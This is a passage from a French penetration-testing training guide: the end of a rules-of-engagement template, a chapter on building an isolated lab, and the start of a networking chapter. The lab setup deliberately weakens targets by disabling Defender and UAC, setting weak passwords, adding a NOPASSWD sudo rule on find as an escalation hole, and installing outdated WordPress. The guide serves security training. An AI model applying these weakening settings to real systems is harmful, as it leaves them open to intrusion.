## 6. Clauses juridiques

**Confidentialité :**
- [Clauses détaillées]

**Limitation de responsabilité :**
- [Clauses détaillées]

**Signatures :**

Pour SecureTest :
Nom, Titre, Date, Signature

Pour TechCorp :
Nom, Titre, Date, Signature
```

#### Vérification

Une fois le document complété, vérifiez qu'il contient bien :
- Toutes les informations de contact nécessaires
- Un périmètre clairement défini
- Des limitations explicites sur les types de tests
- Une procédure de gestion des incidents
- Des livrables clairement définis
- Des clauses juridiques protégeant les deux parties

#### Vue Blue Team

Dans un contexte réel, ce document serait partagé avec l'équipe de sécurité défensive (Blue Team) pour :
- Les informer des tests à venir
- Leur permettre de distinguer les activités de test des attaques réelles
- Définir les procédures de communication en cas d'alerte
- Évaluer leur capacité de détection (si le test inclut cette dimension)

#### Résultat attendu

Un document de Règles d'Engagement complet, précis et juridiquement solide, qui protège à la fois le client et le prestataire tout en définissant clairement le cadre du test d'intrusion.
# PARTIE I : FONDATIONS eJPT (+ OPSEC NIVEAU 1)

## Chapitre 2 : Environnement labo

### Introduction : Pourquoi ce thème est important

La mise en place d'un environnement de laboratoire adéquat est une étape fondamentale pour tout pentester. Un environnement bien conçu vous permet de pratiquer en toute sécurité, d'expérimenter différentes techniques sans risque légal, et de reproduire des scénarios d'attaque réalistes. Ce chapitre vous guidera dans la création d'un laboratoire complet qui servira de base à tous les exercices pratiques de ce guide, tout en introduisant les premières notions d'OPSEC liées à la gestion de votre environnement de test.

### Configuration de l'environnement attaquant (Kali 2024.1)

Kali Linux est la distribution de référence pour les tests d'intrusion, maintenue par Offensive Security (les créateurs de l'OSCP). Elle intègre des centaines d'outils préinstallés et préconfigurés.

#### Installation de Kali Linux

**Méthode 1 : Installation sur machine virtuelle (recommandée)**

```bash
# Téléchargement de l'image ISO
wget https://cdimage.kali.org/kali-2024.1/kali-linux-2024.1-installer-amd64.iso

# Vérification de l'intégrité (SHA256)
sha256sum kali-linux-2024.1-installer-amd64.iso
# Comparez avec le hash officiel sur le site de Kali
```

1. Créez une nouvelle machine virtuelle dans VirtualBox/VMware :
   - Type : Linux
   - Version : Debian 64-bit
   - RAM : 4 Go minimum (8 Go recommandé)
   - Disque dur : 80 Go minimum
   - Réseau : Mode NAT + un adaptateur en réseau interne

2. Montez l'ISO et démarrez la VM
3. Suivez l'assistant d'installation
4. Choisissez l'environnement de bureau (XFCE recommandé pour les performances)

**Méthode 2 : Utilisation d'une image préconfigurée**

```bash
# Téléchargement de l'image VM
wget https://kali.download/virtual-images/kali-2024.1/kali-linux-2024.1-virtualbox-amd64.ova

# Importation dans VirtualBox
vboxmanage import kali-linux-2024.1-virtualbox-amd64.ova
```

#### Configuration post-installation

Une fois Kali installé, plusieurs étapes de configuration sont nécessaires :

1. **Mise à jour du système**

```bash
sudo apt update
sudo apt full-upgrade -y
```

2. **Installation des outils supplémentaires**

```bash
# Outils essentiels
sudo apt install -y python3-pip golang-go seclists curl enum4linux-ng feroxbuster

# Outils spécifiques OSCP
sudo apt install -y gobuster oscanner sipvicious smbmap
```

3. **Configuration de l'environnement Python**

```bash
# Installation des bibliothèques Python couramment utilisées
pip3 install impacket bloodhound pwntools requests beautifulsoup4
```

4. **Configuration du proxy Burp Suite**

```bash
# Lancement de Burp Suite
burpsuite &

# Configuration du navigateur Firefox pour utiliser le proxy Burp
# Paramètres > Réseau > Paramètres > Configuration manuelle du proxy
# HTTP Proxy: 127.0.0.1 Port: 8080
```

5. **Personnalisation de l'environnement**

```bash
# Création d'un répertoire de travail
mkdir -p ~/pentest_labs/{reconnaissance,exploitation,post_exploitation,tools,reports}

# Configuration de bash
cat >> ~/.bashrc << EOF
# Alias utiles pour le pentesting
alias nmap_basic="nmap -sV -sC"
alias nmap_full="nmap -sV -sC -p-"
alias nmap_vuln="nmap --script vuln"
alias webserver="python3 -m http.server 8000"
EOF

source ~/.bashrc
```

#### Considérations OPSEC pour l'environnement attaquant

Même dans un environnement de laboratoire, il est important d'adopter de bonnes pratiques OPSEC :

1. **Isolation réseau** : Configurez votre VM Kali pour qu'elle ne puisse accéder qu'aux réseaux de test, pas à votre réseau personnel ou professionnel.

2. **Snapshots réguliers** : Prenez des instantanés de votre VM avant et après chaque exercice pour pouvoir revenir à un état connu.

3. **Séparation des environnements** : Utilisez des VMs distinctes pour différents projets ou clients.

4. **Chiffrement du disque** : Activez le chiffrement du disque de votre VM pour protéger les données sensibles.

```bash
# Vérification si le chiffrement est actif
sudo dmsetup status

# Pour les nouvelles installations, sélectionnez l'option de chiffrement
# pendant le processus d'installation
```

### Configuration des cibles (Windows Server 2019, Windows 10 Pro, Windows 11, Ubuntu 22.04 LTS)

Pour un laboratoire complet, vous aurez besoin de plusieurs systèmes cibles représentant différents environnements.

#### Windows Server 2019 (Contrôleur de domaine)

1. **Téléchargement**
   - Téléchargez l'ISO d'évaluation de Windows Server 2019 depuis le site de Microsoft
   - Période d'évaluation de 180 jours

2. **Installation**
   - Créez une VM avec 4 Go de RAM et 60 Go de disque
   - Installez Windows Server 2019 Standard avec Desktop Experience
   - Configurez une adresse IP statique (ex: 192.168.56.10)

3. **Configuration en tant que contrôleur de domaine**

```powershell
# Installation du rôle AD DS
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# Promotion en contrôleur de domaine
Install-ADDSForest -DomainName "lab.local" -DomainNetbiosName "LAB" -InstallDns

# Création d'utilisateurs de test
New-ADUser -Name "John Smith" -GivenName "John" -Surname "Smith" -SamAccountName "jsmith" -UserPrincipalName "jsmith@lab.local" -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Enabled $true
New-ADUser -Name "Admin User" -GivenName "Admin" -Surname "User" -SamAccountName "adminuser" -UserPrincipalName "adminuser@lab.local" -AccountPassword (ConvertTo-SecureString "AdminPass123!" -AsPlainText -Force) -Enabled $true

# Ajout de l'utilisateur au groupe Administrateurs du domaine
Add-ADGroupMember -Identity "Domain Admins" -Members "adminuser"
```

#### Windows 10 Pro

1. **Téléchargement**
   - Téléchargez l'ISO d'évaluation de Windows 10 Enterprise depuis le site de Microsoft

2. **Installation**
   - Créez une VM avec 4 Go de RAM et 50 Go de disque
   - Installez Windows 10 Pro
   - Configurez une adresse IP statique (ex: 192.168.56.20)

3. **Configuration pour le laboratoire**

```powershell
# Désactivation de Windows Defender (pour les tests uniquement)
Set-MpPreference -DisableRealtimeMonitoring $true

# Joindre au domaine
Add-Computer -DomainName "lab.local" -Credential LAB\adminuser -Restart

# Installation de services vulnérables pour les exercices
# (À faire après avoir rejoint le domaine)
# Exemple : Installation d'un serveur web IIS
Install-WindowsFeature -name Web-Server -IncludeManagementTools
```

#### Windows 11

1. **Téléchargement**
   - Téléchargez l'ISO d'évaluation de Windows 11 Enterprise depuis le site de Microsoft

2. **Installation**
   - Créez une VM avec 4 Go de RAM et 50 Go de disque
   - Assurez-vous que votre hyperviseur prend en charge TPM 2.0 et Secure Boot (ou utilisez des contournements)
   - Installez Windows 11
   - Configurez une adresse IP statique (ex: 192.168.56.30)

3. **Configuration pour le laboratoire**

```powershell
# Désactivation de Windows Defender (pour les tests uniquement)
Set-MpPreference -DisableRealtimeMonitoring $true

# Joindre au domaine
Add-Computer -DomainName "lab.local" -Credential LAB\adminuser -Restart

# Configuration des paramètres de sécurité pour les tests
# Désactivation de certaines protections (uniquement en environnement de test)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
```

#### Ubuntu 22.04 LTS

1. **Téléchargement**
   - Téléchargez l'ISO d'Ubuntu 22.04 LTS depuis le site officiel

2. **Installation**
   - Créez une VM avec 2 Go de RAM et 20 Go de disque
   - Installez Ubuntu Server (sans interface graphique pour économiser des ressources)
   - Configurez une adresse IP statique (ex: 192.168.56.40)

3. **Configuration pour le laboratoire**

```bash
# Mise à jour du système
sudo apt update && sudo apt upgrade -y

# Installation de services pour les exercices
sudo apt install -y apache2 mysql-server php libapache2-mod-php php-mysql openssh-server

# Configuration de services vulnérables (uniquement pour le labo)
# SSH avec authentification par mot de passe
sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
sudo systemctl restart ssh

# Création d'utilisateurs de test
sudo useradd -m -s /bin/bash testuser
echo "testuser:Password123!" | sudo chpasswd

# Attribution de privilèges sudo à l'utilisateur test (pour les exercices d'élévation de privilèges)
echo "testuser ALL=(ALL) NOPASSWD:/usr/bin/find" | sudo tee /etc/sudoers.d/testuser
```

### Mise en place d'un réseau virtuel (VirtualBox/VMware)

La configuration réseau est cruciale pour isoler votre environnement de test et permettre la communication entre vos machines.

#### Configuration avec VirtualBox

1. **Création d'un réseau interne**

```bash
# Création d'un réseau hôte uniquement
VBoxManage hostonlyif create

# Configuration du réseau (remplacez vboxnet0 par le nom de votre interface)
VBoxManage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0
```

2. **Configuration des VMs**
   - Pour chaque VM, ajoutez un adaptateur réseau en mode "Réseau privé hôte"
   - Sélectionnez l'interface créée (vboxnet0)
   - Ajoutez un second adaptateur en mode NAT pour l'accès Internet

#### Configuration avec VMware

1. **Création d'un réseau personnalisé**
   - Ouvrez Virtual Network Editor (nécessite des droits administrateur)
   - Créez un réseau VMnet personnalisé (ex: VMnet2)
   - Configurez-le en mode "Host-only"
   - Définissez la plage d'adresses IP (ex: 192.168.56.0/24)

2. **Configuration des VMs**
   - Pour chaque VM, configurez un adaptateur réseau sur le VMnet créé
   - Ajoutez un second adaptateur en mode NAT pour l'accès Internet

#### Vérification de la connectivité

Une fois toutes les VMs configurées, vérifiez que la communication fonctionne correctement :

```bash
# Depuis Kali Linux, testez la connectivité vers chaque cible
ping -c 4 192.168.56.10  # Windows Server 2019
ping -c 4 192.168.56.20  # Windows 10
ping -c 4 192.168.56.30  # Windows 11
ping -c 4 192.168.56.40  # Ubuntu 22.04
```

### Installation des applications vulnérables (Metasploitable 2, OWASP Juice Shop, DVWA, WordPress)

Pour pratiquer l'exploitation web et système, plusieurs applications vulnérables sont indispensables.

#### Metasploitable 2

Metasploitable 2 est une machine virtuelle Linux délibérément vulnérable, conçue pour la formation à la sécurité.

1. **Téléchargement**

```bash
# Depuis Kali Linux
wget https://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip
unzip metasploitable-linux-2.0.0.zip
```

2. **Importation dans VirtualBox/VMware**
   - Importez le fichier .vmdk
   - Configurez la VM avec 1 Go de RAM
   - Configurez l'adaptateur réseau sur votre réseau de test
   - Démarrez la VM (identifiants par défaut : msfadmin/msfadmin)

3. **Configuration réseau**

```bash
# Connectez-vous à Metasploitable 2
# Configurez une adresse IP statique
sudo ifconfig eth0 192.168.56.50 netmask 255.255.255.0 up
```

#### OWASP Juice Shop

OWASP Juice Shop est une application web moderne délibérément vulnérable, parfaite pour apprendre la sécurité des applications web.

1. **Installation sur Ubuntu 22.04**

```bash
# Connectez-vous à votre VM Ubuntu
# Installation de Node.js
sudo apt update
sudo apt install -y nodejs npm

# Installation de Juice Shop
git clone https://github.com/juice-shop/juice-shop.git
cd juice-shop
npm install
npm start
```

2. **Accès à l'application**
   - L'application est accessible sur http://192.168.56.40:3000

#### DVWA (Damn Vulnerable Web Application)

DVWA est une application PHP/MySQL délibérément vulnérable, conçue pour aider les professionnels de la sécurité à tester leurs compétences.

1. **Installation sur Ubuntu 22.04**

```bash
# Connectez-vous à votre VM Ubuntu
# Installation des dépendances
sudo apt install -y apache2 mysql-server php php-mysqli php-gd libapache2-mod-php

# Configuration de MySQL
sudo mysql -e "CREATE DATABASE dvwa;"
sudo mysql -e "CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'password';"
sudo mysql -e "GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';"
sudo mysql -e "FLUSH PRIVILEGES;"

# Téléchargement et installation de DVWA
cd /var/www/html
sudo rm index.html
sudo git clone https://github.com/digininja/DVWA.git .
sudo cp config/config.inc.php.dist config/config.inc.php
sudo sed -i "s/p@ssw0rd/password/" config/config.inc.php
sudo chown -R www-data:www-data /var/www/html
```

2. **Accès à l'application**
   - L'application est accessible sur http://192.168.56.40/setup.php
   - Cliquez sur "Create / Reset Database"
   - Connectez-vous avec admin/password

#### WordPress vulnérable

WordPress est la cible de nombreuses attaques en raison de sa popularité. Une installation obsolète est parfaite pour l'entraînement.

1. **Installation sur Ubuntu 22.04**

```bash
# Connectez-vous à votre VM Ubuntu
# Création de la base de données
sudo mysql -e "CREATE DATABASE wordpress;"
sudo mysql -e "CREATE USER 'wpuser'@'localhost' IDENTIFIED BY 'password';"
sudo mysql -e "GRANT ALL PRIVILEGES ON wordpress.* TO 'wpuser'@'localhost';"
sudo mysql -e "FLUSH PRIVILEGES;"

# Installation de WordPress (version obsolète pour les tests)
cd /tmp
wget https://wordpress.org/wordpress-4.7.zip
unzip wordpress-4.7.zip
sudo mv wordpress /var/www/html/wordpress
sudo chown -R www-data:www-data /var/www/html/wordpress

# Configuration d'Apache pour WordPress
sudo bash -c 'cat > /etc/apache2/sites-available/wordpress.conf << EOF
<VirtualHost *:80>
    ServerName wordpress.lab.local
    DocumentRoot /var/www/html/wordpress
    <Directory /var/www/html/wordpress>
        AllowOverride All
    </Directory>
</VirtualHost>
EOF'

sudo a2ensite wordpress.conf
sudo a2enmod rewrite
sudo systemctl restart apache2
```

2. **Configuration de WordPress**
   - Accédez à http://192.168.56.40/wordpress
   - Suivez l'assistant d'installation
   - Utilisez les informations de base de données créées précédemment

### Connexion VPN vers plateformes cloud (TryHackMe / HackTheBox)

Les plateformes d'entraînement en ligne sont un excellent complément à votre laboratoire local.

#### Configuration de TryHackMe

1. **Création d'un compte**
   - Inscrivez-vous sur https://tryhackme.com
   - Choisissez un abonnement (gratuit ou premium)

2. **Configuration du VPN**

```bash
# Depuis Kali Linux
# Téléchargement du fichier de configuration OpenVPN
# (Disponible dans votre profil TryHackMe après inscription)

# Installation d'OpenVPN si nécessaire
sudo apt install -y openvpn

# Connexion au VPN
sudo openvpn /chemin/vers/fichier.ovpn
```

#### Configuration de HackTheBox

1. **Création d'un compte**
   - Inscrivez-vous sur https://www.hackthebox.com
   - Complétez le challenge d'invitation (ou utilisez un code d'invitation)

2. **Configuration du VPN**

```bash
# Depuis Kali Linux
# Téléchargement du fichier de configuration OpenVPN
# (Disponible dans votre profil HackTheBox après inscription)

# Connexion au VPN
sudo openvpn /chemin/vers/fichier.ovpn
```

#### Considérations OPSEC pour les plateformes en ligne

1. **Isolation des connexions** : Utilisez une VM dédiée pour vous connecter à ces plateformes.

2. **Vérification des outils** : Certains outils peuvent envoyer des données télémétriques; vérifiez leur comportement.

3. **Respect des règles** : Ces plateformes ont des règles strictes concernant les techniques autorisées.

### Snapshots et sauvegardes

Les snapshots sont essentiels pour maintenir votre environnement de laboratoire en bon état et pouvoir revenir rapidement à un état connu.

#### Création de snapshots dans VirtualBox

```bash
# Depuis la ligne de commande
VBoxManage snapshot "Kali Linux" take "État initial" --description "Installation fraîche"
VBoxManage snapshot "Windows Server 2019" take "DC configuré" --description "Contrôleur de domaine configuré"
```

Ou via l'interface graphique :
1. Sélectionnez la VM
2. Cliquez sur "Snapshots"
3. Cliquez sur "Prendre un snapshot"

#### Création de snapshots dans VMware

Via l'interface graphique :
1. Sélectionnez la VM
2. Cliquez sur "VM" > "Snapshot" > "Take Snapshot"
3. Donnez un nom et une description

#### Stratégie de snapshots recommandée

1. **État initial** : Après l'installation et la configuration de base
2. **Pré-exercice** : Avant de commencer un nouvel exercice
3. **Post-exercice** : Après avoir terminé un exercice réussi
4. **Points de restauration réguliers** : Tous les 5-10 exercices

#### Sauvegarde des VMs

En plus des snapshots, effectuez des sauvegardes complètes périodiquement :

```bash
# Exportation d'une VM VirtualBox
VBoxManage export "Kali Linux" -o kali_backup.ova

# Exportation d'une VM VMware
# Utilisez l'option "Export OVF Template" dans l'interface
```

### Vue Blue Team / logs générés / alertes SIEM

Même dans un environnement de laboratoire, il est important de comprendre les traces générées par vos actions.

#### Logs générés lors de la configuration

1. **Installation de systèmes**
   - Logs d'installation (Windows: setupact.log, Linux: /var/log/installer)
   - Logs de démarrage initial (Windows: System Event Log, Linux: /var/log/syslog)

2. **Configuration réseau**
   - Logs DHCP (Windows: System Event Log, Linux: /var/log/syslog)
   - Logs de connexion réseau (Windows: netsetup.log, Linux: /var/log/daemon.log)

3. **Installation d'applications**
   - Logs d'installation (Windows: Application Event Log, Linux: /var/log/dpkg.log)
   - Logs de service (Windows: Service-specific logs, Linux: /var/log/[service])

#### Détection possible

Dans un environnement d'entreprise, ces activités pourraient être détectées par :

1. **Systèmes de gestion de parc**
   - Détection de nouvelles machines sur le réseau
   - Alertes sur les installations non autorisées

2. **Surveillance réseau**
   - Détection de nouveaux flux réseau
   - Identification de services vulnérables exposés

3. **SIEM et EDR**
   - Corrélation d'événements liés à l'installation de logiciels
   - Détection de configurations non standard

### Pièges classiques et erreurs à éviter

#### Erreurs de configuration

1. **Exposition involontaire** : Ne connectez jamais votre environnement de laboratoire à votre réseau de production ou à Internet sans isolation appropriée.

2. **Ressources insuffisantes** : Allouer trop peu de RAM ou d'espace disque peut causer des problèmes de performance ou des crashs.

3. **Snapshots excessifs** : Trop de snapshots peuvent consommer beaucoup d'espace disque et ralentir les VMs.

4. **Négligence des sauvegardes** : Ne comptez pas uniquement sur les snapshots; faites des sauvegardes complètes régulièrement.

#### Erreurs de sécurité

1. **Réutilisation de mots de passe** : N'utilisez jamais les mêmes mots de passe que dans vos environnements réels.

2. **Isolation insuffisante** : Assurez-vous que vos VMs vulnérables ne peuvent pas accéder à votre réseau personnel ou à Internet.

3. **Malware échappé** : Certains malwares peuvent s'échapper des VMs; utilisez toujours des snapshots avant de tester des échantillons malveillants.

### OPSEC Tips : bonnes pratiques pour l'environnement labo

1. **Séparation physique** : Si possible, utilisez un ordinateur dédié pour votre laboratoire de pentesting.

2. **Isolation réseau** : Configurez un réseau virtuel isolé sans accès direct à votre réseau principal.

3. **Chiffrement** : Chiffrez les disques de vos VMs pour protéger les données sensibles.

4. **Gestion des identifiants** : Utilisez un gestionnaire de mots de passe dédié pour votre environnement de laboratoire.

5. **Documentation sécurisée** : Documentez votre environnement de manière sécurisée, en évitant de stocker des informations sensibles en clair.

### Points clés

- Un environnement de laboratoire bien configuré est essentiel pour pratiquer en toute sécurité.
- Kali Linux est la distribution de référence pour les tests d'intrusion, avec des centaines d'outils préinstallés.
- La mise en place d'un Active Directory avec Windows Server est cruciale pour s'entraîner aux attaques d'entreprise.
- Les applications vulnérables comme Metasploitable, DVWA et Juice Shop permettent de pratiquer différentes techniques d'exploitation.
- Les snapshots et sauvegardes réguliers sont indispensables pour maintenir votre environnement en bon état.
- L'isolation réseau est primordiale pour éviter toute fuite ou contamination accidentelle.

### Mini-quiz (3 QCM)

1. **Quelle configuration est la plus sécuritaire pour un laboratoire de pentesting ?**
   - A) Toutes les VMs connectées directement à Internet
   - B) Un réseau virtuel isolé avec NAT pour l'accès Internet contrôlé
   - C) Toutes les VMs sur le même réseau que votre ordinateur personnel
   - D) Chaque VM avec sa propre connexion Internet

   *Réponse : B*

2. **Pourquoi est-il important de créer des snapshots de vos VMs ?**
   - A) Pour économiser de l'espace disque
   - B) Pour accélérer les performances des VMs
   - C) Pour pouvoir revenir à un état connu après des tests
   - D) Pour se conformer aux exigences légales

   *Réponse : C*

3. **Quelle pratique représente le plus grand risque dans un environnement de laboratoire ?**
   - A) Utiliser des mots de passe faibles sur les VMs de test
   - B) Ne pas mettre à jour régulièrement Kali Linux
   - C) Connecter des machines vulnérables directement à Internet
   - D) Utiliser des applications obsolètes pour les tests

   *Réponse : C*

### Lab/Exercice guidé : Configuration complète d'un environnement de test

#### Objectif
Mettre en place un environnement de laboratoire complet avec Kali Linux et une cible vulnérable.

#### Prérequis
- VirtualBox ou VMware installé
- Au moins 8 Go de RAM et 100 Go d'espace disque disponible
- Connexion Internet pour télécharger les images

#### Étapes

1. **Installation de Kali Linux**

```bash
# Téléchargement de l'image
wget https://cdimage.kali.org/kali-2024.1/kali-linux-2024.1-virtualbox-amd64.ova

# Importation dans VirtualBox
vboxmanage import kali-linux-2024.1-virtualbox-amd64.ova

# Démarrage de la VM
vboxmanage startvm "Kali Linux"
```

2. **Configuration du réseau hôte uniquement**

```bash
# Création du réseau hôte
VBoxManage hostonlyif create

# Configuration du réseau (remplacez vboxnet0 par le nom de votre interface)
VBoxManage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0

# Ajout d'un adaptateur réseau à Kali
VBoxManage modifyvm "Kali Linux" --nic2 hostonly --hostonlyadapter2 vboxnet0
```

3. **Installation de Metasploitable 2**

```bash
# Téléchargement depuis Kali
wget https://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip
unzip metasploitable-linux-2.0.0.zip

# Création d'une nouvelle VM dans VirtualBox
VBoxManage createvm --name "Metasploitable 2" --ostype Ubuntu --register

# Configuration de la VM
VBoxManage modifyvm "Metasploitable 2" --memory 1024 --nic1 hostonly --hostonlyadapter1 vboxnet0

# Création du disque dur virtuel
VBoxManage convertfromraw metasploitable.vmdk metasploitable.vdi --format VDI

# Attachement du disque
VBoxManage storagectl "Metasploitable 2" --name "SATA Controller" --add sata
VBoxManage storageattach "Metasploitable 2" --storagectl "SATA Controller" --port 0 --device 0 --type hdd --medium metasploitable.vdi

# Démarrage de la VM
VBoxManage startvm "Metasploitable 2"
```

4. **Vérification de la connectivité**

Depuis Kali Linux, ouvrez un terminal et vérifiez la connectivité :

```bash
# Configuration de l'interface réseau sur Kali
sudo ip addr add 192.168.56.5/24 dev eth1
sudo ip link set eth1 up

# Test de connectivité
ping -c 4 192.168.56.2  # Adresse IP par défaut de Metasploitable 2
```

5. **Scan initial de la cible**

```bash
# Scan de base avec Nmap
sudo nmap -sV -sC 192.168.56.2
```

6. **Création d'un snapshot**

```bash
# Création d'un snapshot de l'état initial
VBoxManage snapshot "Kali Linux" take "Initial Setup" --description "Environnement de base configuré"
VBoxManage snapshot "Metasploitable 2" take "Initial Setup" --description "Machine vulnérable prête"
```

#### Vérification

Pour vérifier que votre environnement est correctement configuré :

1. Depuis Kali, vous devriez pouvoir accéder à Metasploitable 2 via SSH :
```bash
ssh msfadmin@192.168.56.2  # Mot de passe : msfadmin
```

2. Vous devriez pouvoir accéder aux services web de Metasploitable 2 :
```bash
firefox http://192.168.56.2
```

3. Nmap devrait identifier de nombreux services vulnérables :
```bash
sudo nmap -sV -p- 192.168.56.2
```

#### Vue Blue Team

Dans un environnement réel, cette configuration générerait :

1. **Logs réseau**
   - Détection de nouvelles machines sur le réseau
   - Identification de services vulnérables exposés

2. **Logs de scan**
   - Les scans Nmap génèrent des entrées dans les logs des services ciblés
   - Un IDS/IPS détecterait les signatures de scan

3. **Logs d'accès**
   - Connexions SSH enregistrées dans /var/log/auth.log
   - Accès web enregistrés dans les logs du serveur web

#### Résultat attendu

À la fin de cet exercice, vous disposerez d'un environnement de laboratoire fonctionnel avec :
- Une machine attaquante (Kali Linux) configurée avec les outils nécessaires
- Une cible vulnérable (Metasploitable 2) avec de nombreux services à exploiter
- Un réseau isolé permettant la communication entre les deux machines
- Des snapshots pour pouvoir revenir à l'état initial si nécessaire
# PARTIE I : FONDATIONS eJPT (+ OPSEC NIVEAU 1)

## Chapitre 3 : Réseaux & TCP/IP pour pentesters

### Introduction : Pourquoi ce thème est important

Une compréhension solide des réseaux et du modèle TCP/IP est fondamentale pour tout pentester. Sans ces connaissances, il est impossible d'identifier correctement les vecteurs d'attaque, de comprendre les vulnérabilités réseau ou d'interpréter les résultats des outils d'analyse. Ce chapitre vous fournira les bases essentielles du fonctionnement des réseaux, avec une orientation spécifique sur les aspects pertinents pour les tests d'intrusion. Nous aborderons également comment ces connaissances s'intègrent dans une démarche OPSEC, en comprenant les traces laissées par vos activités réseau.

### Modèle OSI et TCP/IP : focus pentester

#### Le modèle OSI (Open Systems Interconnection)

Le modèle OSI est un cadre conceptuel à 7 couches qui standardise les fonctions d'un système de communication. Pour un pentester, comprendre ce modèle permet d'identifier à quel niveau une vulnérabilité ou une attaque opère.

**Les 7 couches du modèle OSI :**

1. **Couche Physique** : Transmission des bits bruts sur le médium physique
   - *Pertinence pentesting* : Attaques par écoute passive (sniffing), interception physique
   - *Exemples* : Wiretapping, rogue access points, brouillage de signal

2. **Couche Liaison de données** : Transfert fiable entre deux nœuds connectés
   - *Pertinence pentesting* : Attaques ARP poisoning, MAC flooding, VLAN hopping
   - *Exemples* : Outils comme Ettercap, Arpspoof, Macof

3. **Couche Réseau** : Routage et adressage logique
   - *Pertinence pentesting* : Scan de réseau, IP spoofing, attaques ICMP
   - *Exemples* : Nmap, Hping3, fragmentation IP

4. **Couche Transport** : Connexion de bout en bout, fiabilité
   - *Pertinence pentesting* : Scan de ports, attaques TCP/UDP, session hijacking
   - *Exemples* : SYN flooding, TCP session hijacking, UDP flooding

5. **Couche Session** : Établissement et gestion des sessions
   - *Pertinence pentesting* : Session hijacking, attaques MITM
   - *Exemples* : Cookie stealing, session fixation

6. **Couche Présentation** : Traduction, chiffrement, compression
   - *Pertinence pentesting* : Attaques cryptographiques, exploitation de parsers
   - *Exemples* : SSL/TLS attacks, format string vulnerabilities

7. **Couche Application** : Interface avec les applications
   - *Pertinence pentesting* : Exploitation d'applications, injection SQL, XSS
   - *Exemples* : SQLmap, Burp Suite, OWASP ZAP

#### Le modèle TCP/IP

Le modèle TCP/IP est une version simplifiée du modèle OSI, utilisée dans l'implémentation pratique d'Internet. Il comprend 4 couches qui correspondent approximativement aux 7 couches OSI.

**Les 4 couches du modèle TCP/IP :**

1. **Couche Accès réseau** (équivalent OSI 1-2)
   - *Pertinence pentesting* : Attaques au niveau MAC, ARP poisoning
   - *Commandes utiles* : `ifconfig`, `ip link`, `arp -a`

2. **Couche Internet** (équivalent OSI 3)
   - *Pertinence pentesting* : Scan de réseau, routage, firewall evasion
   - *Commandes utiles* : `ping`, `traceroute`, `ip route`

3. **Couche Transport** (équivalent OSI 4)
   - *Pertinence pentesting* : Scan de ports, analyse de services
   - *Commandes utiles* : `netstat -tuln`, `ss -tuln`

4. **Couche Application** (équivalent OSI 5-7)
   - *Pertinence pentesting* : Exploitation de services, attaques applicatives
   - *Commandes utiles* : `telnet`, `nc`, `curl`

#### Adressage IP et sous-réseaux

La compréhension de l'adressage IP est cruciale pour cartographier correctement un réseau cible.

**IPv4 :**
- Format : 4 octets (32 bits), notation décimale pointée (ex: 192.168.1.1)
- Classes d'adresses : A (1-126), B (128-191), C (192-223), D (224-239), E (240-255)
- Adresses privées : 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16

**Calcul de sous-réseau :**

```bash
# Exemple : Réseau 192.168.1.0/24
# Masque de sous-réseau : 255.255.255.0
# Nombre d'adresses : 2^(32-24) = 2^8 = 256 adresses
# Plage utilisable : 192.168.1.1 - 192.168.1.254
# Adresse de broadcast : 192.168.1.255

# Commande pour calculer un sous-réseau
ipcalc 192.168.1.0/24

# Commande pour lister les sous-réseaux d'un réseau plus grand
sipcalc 192.168.0.0/16 -s 24
```

**IPv6 :**
- Format : 8 groupes de 4 chiffres hexadécimaux (128 bits)
- Exemple : 2001:0db8:85a3:0000:0000:8a2e:0370:7334
- Forme abrégée : 2001:db8:85a3::8a2e:370:7334

```bash
# Commande pour afficher les adresses IPv6
ip -6 addr show

# Scan IPv6 avec Nmap
nmap -6 2001:db8:85a3::8a2e:370:7334
```

### Ports et services courants

La connaissance des ports standards est essentielle pour identifier rapidement les services potentiellement vulnérables.

#### Ports TCP courants

| Port | Service | Description | Vulnérabilités courantes |
|------|---------|-------------|--------------------------|
| 21 | FTP | Transfert de fichiers | Authentification anonyme, bruteforce, clear-text credentials |
| 22 | SSH | Secure Shell | Versions obsolètes, bruteforce, key-based attacks |
| 23 | Telnet | Terminal distant non chiffré | Clear-text credentials, MITM |
| 25 | SMTP | Envoi d'emails | Open relay, user enumeration, spoofing |
| 53 | DNS | Résolution de noms | Zone transfer, cache poisoning, tunneling |
| 80 | HTTP | Web non chiffré | Nombreuses (XSS, SQLi, LFI/RFI, etc.) |
| 88 | Kerberos | Authentification | Kerberoasting, AS-REP Roasting, Pass-the-Ticket |
| 110 | POP3 | Réception d'emails | Clear-text credentials, MITM |
| 135 | MSRPC | Windows RPC | Nombreuses vulnérabilités historiques |
| 139 | NetBIOS | Session NetBIOS | Null sessions, information disclosure |
| 389 | LDAP | Directory services | Anonymous bind, information disclosure |
| 443 | HTTPS | Web chiffré | Vulnérabilités SSL/TLS, mêmes que HTTP |
| 445 | SMB | Partage de fichiers Windows | EternalBlue, null sessions, relay attacks |
| 1433 | MSSQL | Base de données Microsoft | SQLi, default credentials, xp_cmdshell |
| 3306 | MySQL | Base de données MySQL | SQLi, default credentials, UDF injection |
| 3389 | RDP | Bureau à distance Windows | BlueKeep, bruteforce, MitM |
| 5985 | WinRM | Windows Remote Management | Default configuration, credential attacks |

#### Ports UDP courants

| Port | Service | Description | Vulnérabilités courantes |
|------|---------|-------------|--------------------------|
| 53 | DNS | Résolution de noms | Mêmes que TCP |
| 67/68 | DHCP | Attribution d'adresses IP | DHCP spoofing, rogue DHCP |
| 69 | TFTP | Transfert de fichiers simplifié | No authentication, file disclosure |
| 123 | NTP | Synchronisation d'horloge | NTP amplification, time shifting |
| 161 | SNMP | Gestion de réseau | Community strings default, information disclosure |
| 500 | IKE/ISAKMP | VPN IPsec | Aggressive mode, weak PSK |
| 1900 | UPNP | Universal Plug and Play | Information disclosure, port mapping |

#### Identification des services avec Nmap

```bash
# Scan des ports courants avec détection de version
